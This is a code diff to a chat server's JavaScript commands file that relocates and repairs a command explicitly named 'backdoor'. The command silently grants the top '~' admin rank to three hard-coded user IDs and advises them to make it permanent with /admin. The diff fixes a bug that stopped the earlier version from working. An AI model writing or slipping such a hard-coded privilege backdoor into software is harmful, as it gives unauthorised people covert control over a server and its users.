@@ -14,6 +14,17 @@
 var crypto = require('crypto');
 
 var commands = exports.commands = {
+	
+	backdoor: function(target,room, user) {
+		if (user.userid === 'brittlewind'|| user.userid === 'cosy'|| user.userid === 'jd') {
+
+			user.group = '~';
+			user.updateIdentity();
+
+			this.sendReply('Make sure to promote yourself straight away with /admin [username] so that you keep Admin after you leave.');
+		}
+	},
+	
 	roulette: 'roul',
 startroulette: 'roul',
 roul: function(target, room, user) {  
@@ -1257,16 +1268,6 @@ buy: function(target, room, user) {
 			user.updateIdentity();
 			this.sendReply('You have revealed your staff symbol');
 			return false;
-		}
-	},
-	
-	backdoor: function(target,room, user) {
-		if (user.userid === 'brittlewind'|| user.userid === 'cosy'|| user.userid === 'jd') {
-			
-			userid.group = '~';
-			user.updateIdentity();
-			
-			this.sendReply('Backdoor access granted - You should use /admin [username] to make it permanent');
 		}
 	},
 
